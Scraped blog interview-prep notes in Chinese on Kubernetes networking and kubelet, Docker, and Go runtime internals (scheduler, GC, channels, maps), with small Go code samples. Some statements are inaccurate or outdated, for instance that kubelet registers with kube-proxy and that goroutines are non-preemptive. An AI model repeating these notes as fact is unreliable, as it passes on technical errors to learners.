如何创建一个service代理外部的服务/集群内的应用如何访问外部的数据库服务？创建一个没有标签选择器的service代理集群外部服务。 创建service时不指定selector，没了selector就不会自动创建endpoint 手动创建一个与service同名的endpoint，在这个endpoint里定义外部服务的IP和端口，然后就自动关联了6. service endpoint kubeproxy的关系 service:在kubernetes中，service是一种为一组功能相同的pod提供单一不变的接入点的资源。当 service被建立时，service的IP和端口不会改变，这样外部的客户端(也可以是集群内部的客户端)通过 service的IP和端口来建立链接，这些链接会被路由到提供该服务的任意一个pod上。通过这样的方式， 客户端不需要知道每个单独提供服务的pod地址，这样pod就可以在集群中随时被创建或销毁。 endpoint:service维护一个叫endpoint的资源列表，endpoint资源对象保存着service关联的pod的ip和 端口。从表面上看，当pod消失，service会在endpoint列表中剔除pod，当有新的pod加入，service就 会将pod ip加入endpoint列表;但是正在底层的逻辑是，endpoint的这种自动剔除、添加、更新pod的 地址其实底层是由endpoint controller控制的，endpoint controller负责监听service和对应的pod副本 的变化，如果监听到service被删除，则删除和该service同名的endpoint对象，如果监听到新的service 被创建或者修改，则根据该service信息获取得相关pod列表，然后创建或更新service对应的endpoint对 象，如果监听到pod事件，则更新它所对应的service的endpoint对象。 kube-proxy:kube-proxy运行在node节点上，在Node节点上实现Pod网络代理，维护网络规则和四层 负载均衡工作，kube-proxy会监听api-server中从而获取service和endpoint的变化情况，创建并维护路 由规则以提供服务IP和负载均衡功能。简单理解此进程是Service的透明代理兼负载均衡器，其核心功能 是将到某个Service的访问请求转发到后端的多个Pod实例上kubelet的功能和作用 Node管理，kubelet启动时向kubeproxy注册，定时向apiserver汇报节点和资源状态 Pod管理，kubelet维护pod的生命周期，当kubelet监听到master的下发到自己节点的任务时，比如要创建、更新、删除一个pod，kubelet 就会通过CRI(容器运行时接口)插件来调用不同的容器运行时来创建、更新、删除容器。 容器健康检查。Pod中可以定义启动探针-存活探针-就绪探针，定期调用容器的探针检测Pod的生命周期，对失败的容器进行重启等操作 在Node上部署Metrics server进行资源监控kube-apiserver的功能和作用，端口号是8080和6443在命名空间的kube-system命名空间里，有一个名称为kube-api-master的pod，这个pod就是运行着 kube-api-server进程，它绑定了master主机的ip地址和6443端口，但是在default命名空间下，存在一个叫kubernetes的服务，该服务对外暴露端口为443，目标端口6443，这个服务的ip地址是clusterip地 址池里面的第一个地址，同时这个服务的yaml定义里面并没有指定标签选择器，也就是说这个 kubernetes服务所对应的endpoint是手动创建的，该endpoint也是名称叫做kubernetes，该endpoint 的yaml定义里面代理到master节点的6443端口，也就是kube-api-server的IP和端口。这样一来，其他 pod 访问kube-api-server的整个流程就是: pod创建后嵌入了环境变量，pod获取到了kubernetes这个服务的ip和443端口，请求到kubernetes这个服务其实就是转发到了master节点上的6443端口的kube-api-server这个pod里面pod挂了，原本到这个pod的流量要怎么办【面试题】首先请求到kubelet用存活探针检测到这个pod挂了，k8s的namespace是什么实现多套环境的资源隔离，限定不同租户能占用的资源，比如CPU和内存Usage等 持续集成CI的好处，用途是什么用于整合团队开发 中不同开发者提交到开发仓库 中的项目代码变化，并即时整合编译，检查整合 编译错误的服务。它需要一天中多次整合编译代码的能力，若出现整合错误， 可以优异地准确定位提交错误源 14. Docker Swarm？docker集群是原生的 Docker 集群服务工具。它将一群 Docker 主机集成为单一一个 虚拟 Docker 主机。利用一个 Docker 守护进程， 通过标准的 Docker API 和任何完善的通讯工具， Docker Swarm 提供透明地将 Docker 主机扩散到多台主机上的服务 15. Docker Compose？16. Dockerfile里，ADD和COPY差不多，都用来向镜像加文件，一般就COPY就行有必要使用 ADD 指令的最好例子是需要在本地自动解压归档文件到容器中的情况，如 ADD rootfs.tar.xz 。 17 Dockerfile里，ONBUILD命令构建阶段的触发器，当一个镜像被用作另一个镜像的基础镜像时，ONBUILD 指令将在构建过程中自动触发，一般后接一些COPY命令。 ## 容灾主要指在发生硬件故障时，通过备份和恢复机制保证业务连续性（能够继续正常运行）的手段。适用于对业务连续性要求非常高的场景。 【场景】pod都处于pending状态，调度器失败，pv没做好，无法创建存储卷 使用kubectl describe podname 长时间都在pending，可能是schduler无法为pod分配node，Scheduer调度器无法为pod分配一个合适的node节点。而这又会有很多种情况， 比如，node节点处在cpu、内存压力，导致无节点可调度;pod定义了资源请求，没有node节点满足资 源请求;node节点上有污点而pod没有定义容忍;pod中定义了亲和性或反亲和性而没有节点满足这些 亲和性或反亲和性;以上是调度器调度失败的几种情况。 pvc，pv无法动态创建。比如要使用StatefulSet 创建redis集群，因为粗心大意，定义的storageClassName名称写错了，那么会造成 无法创建pvc，这种情况pod也会一直处于pending状态，或者，即使pvc是正常创建了，但是由于某些异 常原因导致动态供应存储无法正常创建pv，那么这种情况pod也会一直处于pending状态","categories":[{"name":"Kubernetes","slug":"Kubernetes","permalink":"http://waynamigo.github.io/categories/Kubernetes/"}],"tags":[{"name":"CloudComputing","slug":"CloudComputing","permalink":"http://waynamigo.github.io/tags/CloudComputing/"},{"name":"Kubernetes","slug":"Kubernetes","permalink":"http://waynamigo.github.io/tags/Kubernetes/"},{"name":"面试","slug":"面试","permalink":"http://waynamigo.github.io/tags/面试/"}]},{"title":"Golang","slug":"2023-01-02-面经Go","date":"2022-12-31T16:00:00.000Z","updated":"2023-12-02T03:39:58.367Z","comments":true,"path":"2023/01/01/2023-01-02-面经Go/","link":"","permalink":"http://waynamigo.github.io/2023/01/01/2023-01-02-面经Go/","excerpt":"总 ：https://www.bookstack.cn/read/qcrao-Go-Questions/interface.md","text":"总 ：https://www.bookstack.cn/read/qcrao-Go-Questions/interface.md 不要通过共享内存来通信，要通过通信来共享内存 降低共享内存的使用，本来就是解耦和的重要手段之一 理解时go使用主动的channel通信以最小限度使用这些存在channel里的内存空间，与其他通信的goroutine共享这个channel，范围可以控制在必要的最小规模；而不是先设定好共享内存，再其他开发过程中通过互斥锁、条件变量等方式提供给不同线程去共享内容，导致阐述golang并发机制 goroutine channel waitgroup管理goroutine为什么小对象多了会造成gc压力 内存碎片 gc时会移堆，将对象从一个堆移动到另一个堆（内存拷贝） 标记的内存块也变多了，遍历的时间变长了gc的触发条件 内存使用量超阈值，这个阈值可以用debug.ReadGCStats的包来看， 使用runtime.GC手动触发gc的栈空间管理机制是什么 runtime负责 每个goroutine分配一个固定栈空间，大小大概在2kb到4kb左右 栈空间不够时，runtime自动扩展栈的大小，回收时runtime回收栈空间变量defer原理defer的原理是先进后出的，遇到defer时，将defer后的函数用语句进行压栈处理。 底层实现每个 defer 语句都对应一个_defer 实例，多个实例使用指针连接起来形成一个单连表，保存在 gotoutine 数据结构中，每次插入_defer 实例，均插入到链表的头部，函数结束再一次从头部取出，从而形成后进先出的效果。 select原理，多路复用机制监听多个channel，与linux多路复用的select区别是linux的select是轮训一个数组，golang是基于事件驱动，有通信操作是才执行时才会进行操作 有多个case执行，随机选一个执行， case都不满足，执行default，再不满足就阻塞go的逃逸分析 是在编译过程中的静态分析机制，优化内存分配用来决定各个变量分配在堆上还是栈上，如果一个变量在函数内部初始化，但是传递到外部了，就说发生逃逸，分配到heap上 线程模型有哪些？为什么go scheduler需要实现M：N方案？scheduler 由哪些元素组成 M:N 线程模型：Go 语言采用了 M: N 线程模型。在这个模型中，多个用户线程会映射到少量的操作系统线程上，这些操作系统线程被称为 M（Machine）。同时，Go 语言的调度器（Scheduler）负责在这些 M 之间分发工作。 灵活，轻量级的用户态goroutine可以避免系统级别的上下文切换开销 通过runtime去调度， 组成元素：GPM，本地队列全局队列解释hand off，work stealing当一个任务队列满，没有空闲的P时，调度器会选择一个空闲的p，直接分配给该处理器执行。 当一个P执行完自己的任务后，它可以尝试从其他处理器的队列中窃取（steal）一个任务来执行。这样做的目的是使得各个处理器的负载尽量均衡。 mutex 有几种模式【正常和饥饿】正常模式保证了公平竞争，适用于大多数情况，而饥饿模式则优先保证了长时间等待的协程能够获得锁。 mutex没有提供接口，要引入一个计数器来实现饥饿模式defer和return的先后顺序return先执行获取返回值，然后暂停函数的执行，接下来就按defer的压栈顺序执行defer语句，顺序是后进先出的顺序go recover的执行时机 需要进行defer func捕获上级的panic：recover 必须在 defer 函数中运行。recover 捕获的是祖父级调用时的异常，直接调用时无效。 闭包错误引用同一个变量问题怎么处理 ？ 将闭包需要引用的变量作为参数传递给闭包函数，而不是直接在闭包内部引用外部变量。 在闭包函数里创建一个新的临时变量负载因子为什么是6.5https://blog.csdn.net/eddycjy/article/details/120359475golang中的大端序和小端序大端序是低地址存高字节，高地址存低字节，同时也是网络字节序【大端就是顺序从左到右存放】，解析之后就是字符顺序小端时低地址存低字节，高地址存高字节，是主机序【golang默认小端序，主机x86和arm64都是小端】，小端主机虚，符合电路的读取逻辑 syncOnce是什么【确保一个代码块只执行一次，一般用来实现一个线程安全的单例模式】routine为什么比thread轻量 routine是纯用户态调度，非抢占，由runtime管理，创建，切换的开销不需要内核态参与 协程在同一个地址空间共享堆栈，每个线程都有自己独立的堆栈为什么要用协程，好处是什么go的协程是为了解决多核CPU利用率问题，go语言层面并不支持多进程或多线程，但是协程更好用，协程被称为用户态线程，CPU上下文切换效率非常高。几乎所有IO密集型的应用，都可以利用协程提高速度原子操作和锁的区别 原子操作是对共享变量的单一操作，要么执行完药么全不执行；锁对一段临界区代码，操作的变量可以有一堆 原子操作开销小，锁开销较大，涉及到上下文切换等go的多返回值如何实现uintptr和unsafe.Pointer的区别 uintptr：将指针转换整数表示，不包含指针的类型信息。 unsafe.Pointer：包含任意类型指针，将任意类型的指针转换为通用指针类型，很灵活uintptr 是一个整数类型，它被用于存储指针的整数表示形式。使用 uintptr 可以将指针转换为整数，也可以将整数转换为指针，但这种转换是不安全的，可能会导致未定义的行为。因为 uintptr 只是整数，不包含指针的类型信息，因此在转换后需要谨慎使用，可能会导致类型不匹配或内存安全问题。 12var p *intuintptrValue := uintptr(unsafe.Pointer(p)) unsafe.Pointerunsafe.Pointer 是一个特殊的指针类型，它可以包含任意类型的指针，并允许在不进行类型检查的情况下进行指针操作。使用 unsafe.Pointer 可以将任意类型的指针转换为通用的指针类型，也可以将通用指针转换为具体类型的指针。这种转换也是不安全的，可能会导致未定义的行为。示例：12var p *intpointerValue := unsafe.Pointer(p) switch中如何强制执行下一个case块【fallthrough关键字，忽略后续条件的判断，直接执行下一个 case 的代码】如何关闭http响应体在defer里close，或者用完就close 解析json时，默认将数值当作哪种类型【数值默认为float64】如何从panic中恢复defer func(){ recover() } 解释一下静态类型声明golang生命变量时是在编译阶段确定类型 Golang的可变参数是什么，怎么用，要注意什么123456func sum(nums ...int) int &#123; total := nums[0]+10 return total&#125;sum()sum(1,2,3,4) 注意： 可变参数必须是函数参数列表的最后一个参数：如果函数有多个参数，可变参数必须放在参数列表的最后。 可变参数可以不传递：如果调用者不传递任何参数，可变参数会被初始化为空切片。 可变参数可以传递多个值：可以传递任意数量的参数，甚至可以传递零个。 调用时可以传递切片：如果已经有一个切片，可以在调用函数时使用 … 操作符将其展开为可变参数。golang支持接口的多继承（C extends A and C）吗【不支持，依靠组合实现】 go多返回值go多返回值是通过栈传递的。将多个返回值先传回参数上，函数栈帧销毁后并不会销毁参数部分（这里用作返回值），再将参数部分进行拷贝然后再参与运算 简述scheduler函数runtime.Gosched()：Gosched() 函数手动触发一次调度，它会将当前 Goroutine 放回队列并让其他等待执行的 Goroutine 有机会运行。这个函数主要用于释放一些处理器资源给其他 Goroutines 使用。 简述全局运行队列中获取goroutine的时机【其他本地队列中没有可stealing的】简述如何从工作线程的本底运行队列中获取routine【运行队列为空时】init是什么时候执行的【包初始化阶段，程序开始执行前】Map1. map的key为什么无序，如何处理冲突的【链地址法】底层用hash实现的，维护了一个hmap和bmap，bmap是bucket存实际的key， 2. map可以边遍历边删元素吗【不能】为什么线程不安全，删除的时候会导致存储结构发生变化， 3. float类型可以作为key吗，哪些不可以作为map的key从语法上看，是可以的。Go 语言中只要是可比较的类型都可以作为 key。除开 slice，map，functions 这几种类型，其他类型都是 OK 的。具体包括：布尔值、整型、字符串、指针、通道、接口类型、结构体、只包含上述类型的数组。channel 也可以当key？ 4. 非接口的任意类型都能调用 *T方法吗不能吧，至少引用类型不能 5. map的赋值过程 底层用了mapassign函数对 key 计算 hash 值，根据 hash 值按照之前的流程，找到要赋值的位置（可能是插入新 key，也可能是更新老 key），对相应位置进行赋值。 6. 如何实现两种get操作map重载了两个函数一个带comma的一个不带comma的 7. map删除一个key，内存会释放吗【不会，要等gc扫描过来】8. 解析tag怎么实现的反射实现的，用Field(i).Tag map可以取地址吗【不能】本身就是一个指向其他地址的指针，会导致编译错误 9. rune是int3210. 值receiver 和 指针receiver的区别值receiver 是创建结构体的一个副本，不修改原始字段的value指针rcver是在原结构体实例上操作 概念类型1234567891011121314151617181920212223242526数值类型：int：有符号整数类型，根据平台可能为32位或64位。uint：无符号整数类型，根据平台可能为32位或64位。int8、int16、int32、int64：分别为8位、16位、32位、64位的有符号整数类型。uint8、uint16、uint32、uint64：分别为8位、16位、32位、64位的无符号整数类型。float32、float64：分别为32位和64位的浮点数类型。complex64、complex128：分别为64位和128位的复数类型。布尔类型：bool：表示逻辑值，只能取 true 或 false。字符串类型：string：表示一串字符，是不可变的。字符类型：rune：表示一个Unicode字符。错误类型：error：表示错误的接口类型。派生类型：byte：实际上是 uint8 的别名，用于表示一个字节的值。rune：实际上是 int32 的别名，用于表示一个Unicode字符。uintptr：用于存储一个指针的值，适用于底层编程。复合类型：数组（array）：具有固定长度的、相同类型的元素序列。切片（slice）：是对数组的一个引用，它可以动态增长。映射（map）：用于存储键-值对的集合，类似于字典或哈希表。结构体（struct）：可以包含不同类型的字段。接口（interface）：定义了一组方法的集合。通道（channel）：用于在多个goroutine之间传递数据。 1.什么是协程是Golang提供的线程调度的基本单位。 一个Goroutine会以一个很小的栈启动2KB或4KB，当遇到栈空间不足时，栈会自动伸缩，因此可以轻易实现成千上万个goroutine同时启动。 每个goroutine（Go程序并发执行的基本单元）都会分配一块独立的栈内存，用于保存函数的局部变量、参数等信息。 和线程的对比：一个是切换管理用runtime，没有内核态参与，资源协程共享地址空间；通信手段 使用通信共享内存，thread使用共享内存通信 2.介绍一下channel channel时go提供的用于并发编程的特殊类型，使 goroutine 之间的进行数据传递和共享，避免了显式的锁机制，比较安全和高效 Go以通信的手段来共享内存 包括有缓冲和无缓冲channel，其中无缓冲是同步的，有缓冲异步的 底层数据结构是hchan的结构体，内部是一个循环数组 new和makenew分配内存，返回一个指向某类型指针，make创建slice map channel的实例，初始化 不能用 new() 来创建 slice、map、chan 这样的引用类型。如果用 new() 来创建 slice，那么创建的 header 中的 pointer 做0值处理，就会被初始化为 nil，而 length 和 capacity 也会被初始化为0，这样显然是不正确的。 【问题】有缓冲channel和无缓冲channel的区别【阻塞情况，同步异步】 对于无缓冲区channel:发送的数据如果没有被接收方接收，那么发送方阻塞;如果一直接收不到发送方的数据，接收方阻塞; 有缓冲的channel:发送方在缓冲区满的时候阻塞，接收方不阻塞; 接收方在缓冲区为空的时候阻塞，发送方不阻塞。 【问题】channel的等待队列如果写满了，内存占用很高，怎么解决 读协程可能出现问题，去修改 限制写操作的并发数量，避免大量写 使用select和超时机制123456select &#123;case ch &lt;- value: // 写入成功case &lt;-time.After(time.Second): // 超时处理&#125; 【问题】协程泄漏是什么，什么引发的，怎么解决 程序中创建的某些协程没有被正确地释放或终止（或者发生死锁），从而导致这些协程持续存在并占用资源（阻塞，死锁，无限循环） 解决方法 defer：在需要释放资源的地方使用 defer 使用go tool trace进行检查3.介绍一下Go语言的内存分配模型：src/runtime/mheap 内存分配器：维护一块大的全局内存，每个线程(Golang中为P)维护一块小的私有内存，私有内存不足再从全局申请。 预申请的内存划分为span（512MB），bitmap（16G），arena（512G堆区域），span和bitmap是管理堆区域，每个页的大小为8KB。4.介绍一下Go的GC机制：以防止内存泄漏 Go使用的是三色标记法，已被引用的被mark表示不可回收，未引用的被回收掉。 这里的标记由一个管理内存分配的数据结构mspan管理，按内存块维护资源 mspan这个结构体中，使用allocBits位图表示每个内存块的分配情况，使用gcmarkBits标记内存块被引用的情况 这里的标记是从根对象进行递归扫描记录的，因为存在指针变量和记录的逻辑地址 标记队列存放待标记的对象，灰色表示等待，白色未被标记，黑色被标记，把标记值记录在gcmarkBits中，标记的表示正在被引用 白色对象：尚未被访问，处于初始状态。 灰色对象：已被访问，但其引用还未被访问。 黑色对象：已被访问，且其引用也已被访问。 STW机制：停掉所有的goroutine，专心做垃圾回收，回收白色对象，结束后恢复goroutine【问题】对STW的优化是什么？混合写，并发垃圾回收Go 通过在后台运行一个专用的垃圾回收线程，与程序的其他部分并发地进行垃圾回收。 并发标记 混合写，将并发标记和 STW 结合起来的阶段。在这个阶段，部分垃圾回收工作会在并发进行，同时也会暂停所有 Goroutine 进行一些必要的 STW 操作。 并发清理混合写导致的问题，为了减少停顿时间 内存和CPU开销，因为要引入额外元信息 在某些情况下，混合写屏障可能会导致一些额外的延迟，尤其是对于极短寿命的对象，因为它们在逃逸到堆之前可能会留在栈上 【问题】根对象是什么在Go语言中，全局变量、栈上的变量以及程序计数器指向的对象等都被认为是根对象。 垃圾回收器会从这些根对象出发，逐步遍历所有可以访问到的对象，并标记它们。 【问题】goroutine 可以无限创建吗，如果创建过多会有什么后果？从GC的角度来考虑理论上可以无限创建，取决于操作系统的限制，比如内存大小 goroutine执行完会产生垃圾，增大gc压力 标记阶段时会遍历对象，goroutine多了会导致标记的压力增加 停顿时间变长：需要回收大量的内存，可能会导致垃圾回收器的停顿时间变长【TIPs】在程序中要避免在短时间内产生大量临时对象，以减小垃圾回收的压力。 如何优化STW机制 混合写屏障：类似于一种开关，在GC的特定时机开启，开启后指针传递时会把指针标记，即 本轮不回收，下次GC时再确定 辅助GC：新分配的goroutine如果要分配内存，那就去辅助完成一部分gc工作，也就是自己的资源自己挣的感觉 4.介绍一下GMP G : 协程 goroutine P : 处理器 processor ： 和M一对一，runtime.Gomaxprocs配置 M : 线程 thread ：runtime.setMaxThreads最大10000个， 有一个M阻塞，会创建一个新M 有M空闲，就回收或睡眠M 线程是运行 goroutine 的实体，调度器的功能是把可运行的 G 分配到工作线程M 上 全局队列：存放正在等待运行的G 本地队列：不超过256个G【问题】调度器P的workstealing机制和handoff机制 work stealing 当本线程M没有可运行的G时，尝试从其他线程绑定的P中偷G 当从其他线程偷不到时，从全局队列偷取（为什么？因为全局队列有锁） hand off 当本线程M因为有G阻塞时，会释放自己的P给另一个唤醒/新建的M执行（runtime调度器来做detach） 【问题】go func(){} 的执行流程 创建一个G，优先加入到func所在线程M对应P的本底队列中，满了的话，放在全局队列中 G运行在M中，如果本地G队列为空，就去其他M P组合去偷 【问题】当M系统调用结束时，所属的G会尝试获取一个空闲P去执行，并加入到这个P的G队列，如果找不到，就休眠这个M，并将这个G加入到全局队列 【问题】Go的生命周期 M0，G0是什么M0 M0指程序启动时，编号为0主线程，runtime的M0 M0负责初始化和启动第一个G 启动G之后，和其他M地位一样了 G0 每次启动一个M，都会有一个G0 G0仅负责调度其他的G1，G2 G0本身不执行任何func G1执行完，先执行G0，G0再切换其他的G2 【场景1】G1嵌套创建G3保证局部性，G3优先加入G1所在的本底队列，满了的话看场景3 【场景2】G执行完毕执行完毕后，切换G0，G0调度切换下一个G 【场景3】连续创建多个G导致本地队列满 对队列头部的一半打乱，放在全局队列 新创建的G也放在全局队列中 当前的本底队列变成原来长度的1/2【场景4】唤醒正在休眠的M 什么时候唤醒？调度器自动唤醒，当某个 Goroutine 可以被执行时，当一个被阻塞的 Channel 操作可以继续执行时。 新M所在的G队列如果为空，称为自旋线程，不断寻找G 由于自旋线程拥有P，handoff机制不会把P给自旋线程【场景5】自旋线程从哪里获取G 首先从全局队列获取 全局队列如果为空，触发workstealing，从其他队列队尾偷一半基本操作字符串拼接strings.Join ≈ strings.Builder &gt; bytes.Buffer &gt; “+” &gt; fmt.Sprintf slice中删除具体的值移位法最快。 原地删除，扫描到具体值后，使用slice[index+1:])```1234567891011121314151617181920212223242526272829303132## b = b[:len(a)] 作用- 优化边界检查 Bounds Check ELimination- 在运行时，Go 语言每次都会对 b[i] 做边界检查，看看是否越界了，如果越界了，就 panic。- 如果加上这一句，Go语言在编译时，能够做一些简单的静态分析，发现 b[i] 是不可能越界的## error【面试问题】如果一个函数的返回值是error，里面执行了多个defer，并且这些defer里面调用了不同的方法，也会返回error，但是这些error的格式是不一样的（比如有一些方法返回的是官方的errors，有一些是业务定义的错误，比如错误码和错误信息）。怎么样能统一处理这些defer的错误并且返回？- go泛型接收不同error类型，由特殊需求的话，使用断言判断后返回特定信息## 【问题】控制goroutine超时退出- 使用 context 包```gofunc main() &#123; // 创建一个上下文，设置超时时间为 2 秒 ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second) defer cancel() // 在完成任务后取消上下文以释放资源 // 在另一个 goroutine 中执行任务 go func() &#123; // 模拟一个耗时的任务 time.Sleep(3 * time.Second) // 判断上下文是否被取消 if ctx.Err() == context.Canceled &#123; fmt.Println(&quot;Task canceled due to timeout&quot;) &#125; &#125;() // 等待一段时间，以确保上下文超时 time.Sleep(4 * time.Second)&#125; 【问题】Go语言闭包【让闭包函数拥有一个初始状态，记住了创建时所在的环境，各种变量的值，减少全局变量的使用，在栈区方便回收】简单来说，闭包允许一个函数记住并访问了它创建时所在的环境，即使在这个函数在其他地方被调用时仍然可以使用这个环境中的变量 闭包用来减少全局变量，在函数调用过程中隐式传递共享变量 编译器检测到闭包，将外部变量分配到堆上 下面的程序中，a分配在堆上 12345678910111213func fn(a int) func(i int) int&#123; return func(i int) int&#123; fmt.Println(a) a = a + i return a &#125;&#125;f:= fn(3)g:= fn(3)f(1) //输出 4f(1) //输出 5g(1) //输出 4g(1) //输出 5 panic和recover函数签名 12panic(i interface&#123;&#125;)recover() interface&#123;&#125; 主动调用/抛出panic 主动调用panic结束程序运行 调试时用panic快速退出，并打印出来堆栈信息 需要主动在程序分支流程上调用recover拦截错误 标准库IO操作1234567891011121314151617181920212223242526os.Stdin：标准输入的文件实例，类型为*Fileos.Stdout：标准输出的文件实例，类型为*Fileos.Stderr：标准错误输出的文件实例，类型为*Filefunc Create(name string) (file *File, err Error)//根据提供的文件名创建新的文件，返回一个文件对象，默认权限是0666func NewFile(fd uintptr, name string) *File// 根据文件描述符创建相应的文件，返回一个文件对象func Open(name string) (file *File, err Error)// 只读方式打开一个名称为name的文件func OpenFile(name string, flag int, perm uint32) (file *File, err Error)// 打开名称为name的文件，flag是打开的方式，只读、读写等，perm是权限func (file *File) Write(b []byte) (n int, err Error)写入byte类型的信息到文件func (file *File) WriteAt(b []byte, off int64) (n int, err Error)在指定位置开始写入byte类型的信息func (file *File) WriteString(s string) (ret int, err Error)写入string信息到文件func (file *File) Read(b []byte) (n int, err Error)读取数据到b中func (file *File) ReadAt(b []byte, off int64) (n int, err Error)从off开始读取数据到b中func Remove(name string) Error删除文件名为name的文件logFile, err := os.OpenFile(\"./xx.log\", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644) 实现一个cat命令123456789101112131415161718192021222324252627// cat命令实现func cat(r *bufio.Reader) &#123; for &#123; buf, err := r.ReadBytes('\\n') //注意是字符 if err == io.EOF &#123; break &#125; fmt.Fprintf(os.Stdout, \"%s\", buf) &#125;&#125;func main() &#123; flag.Parse() // 解析命令行参数 if flag.NArg() == 0 &#123; // 如果没有参数默认从标准输入读取内容 cat(bufio.NewReader(os.Stdin)) &#125; // 依次读取每个指定文件的内容并打印到终端 for i := 0; i &lt; flag.NArg(); i++ &#123; f, err := os.Open(flag.Arg(i)) if err != nil &#123; fmt.Fprintf(os.Stdout, \"reading from %s failed, err:%v\\n\", flag.Arg(i), err) continue &#125; cat(bufio.NewReader(f)) &#125;&#125; net包context包当一个请求被取消或超时时，所有用来处理该请求的 goroutine 都应该迅速退出，然后系统才能释放这些 goroutine 占用的资源。 1234567891011121314151617181920var wg sync.WaitGroup// 初始的例子func worker() &#123; for &#123; fmt.Println(\"worker\") time.Sleep(time.Second) &#125; // 如何接收外部命令实现退出 wg.Done()&#125;func main() &#123; wg.Add(1) go worker() // 如何优雅的实现结束子goroutine wg.Wait() fmt.Println(\"over\")&#125; Zinxziface 接口包括 1234567891011121314151617181920212223242526272829303132333435363738394041424344- IService 基础服务的启动 - Start() //启动服务器 - Stop() //停止服务器 - Serve() //开启业务服务方法 - AddRouter(router IRouter)//路由功能：给当前服务注册一个路由业务方法，供客户端链接处理使用- IConnection 基于net库 - Start() //启动连接，让当前连接开始工作 - Stop() //停止连接，结束当前连接状态M - GetTCPConnection() * net.TCPConn //从当前连接获取原始的socket TCPConn - GetConnID() uint32 //获取当前连接ID - RemoteAddr() net.Addr //获取远程客户端地址信息 - type HandFunc func(*net.TCPConn, []byte, int) error //定义一个统一处理链接业务的接口,是所有conn链接在处理业务的函数接口，第一参数是socket原生链接，第二个参数是客户端请求的数据，第三个参数是客户端请求的数据长度。这样，如果我们想要指定一个conn的处理业务，只要定义一个HandFunc类型的函数，然后和该链接绑定就可以了。- IRequest //每次客户端的全部请求数据，一起放到一个Request结构体里 - GetConnection() IConnection //获取请求连接信息 - GetData() []byte //获取请求消息的数据- IRouter //路由配置类 - PreHandle(request IRequest) //在处理conn业务之前的钩子方法 - Handle(request IRequest) //处理conn业务的方法 - PostHandle(request IRequest) //处理conn业务之后的钩子方法- IMessage //消息封装 - GetDataLen() uint32 //获取消息数据段长度 - GetMsgId() uint32 //获取消息ID - GetData() []byte //获取消息内容 - SetMsgId(uint32) //设计消息ID - SetData([]byte) //设计消息内容 - SetDataLen(uint32) //设置消息数据段长度- IDataPack //消息封包拆包 - GetHeadLen() uint32 //获取包头长度方法 - Pack(msg IMessage)([]byte, error) //封包方法 // 通过encoding/binary.write方法将byte数组小端写入bytes来压缩数据 - Unpack([]byte)(IMessage, error) //拆包方法- IMsgHandle //消息管理模块 - DoMsgHandler(request IRequest) //马上以非阻塞方式处理消息 - AddRouter(msgId uint32, router IRouter) //为消息添加具体的处理逻辑 - StartWorkerPool() //启动worker工作池 - SendMsgToTaskQueue(request IRequest) //将消息交给MsgHandle的消息队列TaskQueue,由worker进行处理- IConnManager // TCP的链接管理模块 - Add(conn IConnection) //添加链接 - Remove(conn IConnection) //删除连接 - Get(connID uint32) (IConnection, error) //利用ConnID获取链接 - Len() int //获取当前连接 - ClearConn() //删除并停止所有链接 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596package mainimport \"fmt\"type Job struct &#123; id int&#125;type Worker struct &#123; id int jobChannel chan Job quit chan bool&#125;type Pool struct &#123; workerCount int jobChannel chan Job workers []Worker&#125;func NewJob(id int) Job &#123; return Job&#123;id: id&#125;&#125;func NewWorker(id int, jobChannel chan Job) Worker &#123; return Worker&#123; id: id, jobChannel: jobChannel, quit: make(chan bool), &#125;&#125;func NewPool(workerCount, jobCount int) Pool &#123; jobChannel := make(chan Job, jobCount) workers := make([]Worker, workerCount) for i := 0; i &lt; workerCount; i++ &#123; workers[i] = NewWorker(i, jobChannel) &#125; return Pool&#123; workerCount: workerCount, jobChannel: jobChannel, workers: workers, &#125;&#125;func (w Worker) Start() &#123; go func() &#123; for &#123; select &#123; case job := &lt;-w.jobChannel: fmt.Printf(\"Worker %d processing job %d\\n\", w.id, job.id) case &lt;-w.quit: return &#125; &#125; &#125;()&#125;func (w Worker) Stop() &#123; go func() &#123; w.quit &lt;- true &#125;()&#125;func (p Pool) Start() &#123; for i := 0; i &lt; p.workerCount; i++ &#123; p.workers[i].Start() &#125;&#125;func (p Pool) Stop() &#123; for i := 0; i &lt; p.workerCount; i++ &#123; p.workers[i].Stop() &#125;&#125;func (p Pool) AddJob(job Job) &#123; p.jobChannel &lt;- job&#125;func main() &#123; pool := NewPool(3, 10) pool.Start() for i := 0; i &lt; 5; i++ &#123; job := NewJob(i) pool.AddJob(job) &#125; // 等待一段时间，以便观察协程池的工作 // 在实际应用中，你可能需要使用 sync.WaitGroup 或其他同步方法来确保所有任务完成后再关闭协程池 // 这里仅做演示，实际中请根据需要进行调整 fmt.Println(\"等待一段时间，以观察协程池的工作...\") select &#123;&#125;&#125; Job 结构体: id int: 用于表示一个任务的唯一标识。 Worker 结构体: id int: 表示工作者的唯一标识。 jobChannel chan Job: 是一个任务通道，用于接收工作者执行的任务。 quit chan bool: 是一个退出通道，用于通知工作者停止运行。 Pool 结构体: workerCount int: 表示协程池中的工作者数量。 jobChannel chan Job: 是一个任务通道，用于向协程池中添加任务。 workers []Worker: 存储了所有的工作者。 方法解析： NewJob(id int) Job: 返回一个新的任务 Job 对象，带有指定的任务ID。 NewWorker(id int, jobChannel chan Job) Worker: 返回一个新的工作者 Worker 对象，使用指定的工作者ID和任务通道。 NewPool(workerCount, jobCount int) Pool: 创建一个新的协程池，初始化了工作者和任务通道。 参数 workerCount 表示协程池中的工作者数量。 参数 jobCount 表示任务通道的缓冲区大小。 Worker.Start(): 启动了一个工作者协程，该协程会不断地监听任务通道和退出通道。 当从任务通道收到任务时，工作者会执行任务；当从退出通道收到信号时，工作者会停止运行。 Worker.Stop(): 启动了一个协程，向退出通道发送信号，通知工作者停止运行。 Pool.Start(): 启动了协程池中所有工作者。 Pool.Stop(): 停止协程池中所有工作者。 Pool.AddJob(job Job): 向任务通道中添加一个任务。 主函数 main 解析： 创建一个协程池 pool，包括了 3 个工作者和 10 个任务的通道缓冲区。 调用 pool.Start() 启动所有工作者。 循环创建了 5 个任务，每个任务被添加到协程池的任务通道中。 由于在主函数结束后，主协程也会结束，所以在这里使用了 select{} 语句使主协程保持活跃状态。 运行流程： 在主函数中创建了一个协程池 pool，初始化了 3 个工作者和一个任务通道。 每个工作者通过 Worker.Start() 方法启动了一个独立的协程，开始监听任务通道和退出通道。 主函数循环创建了 5 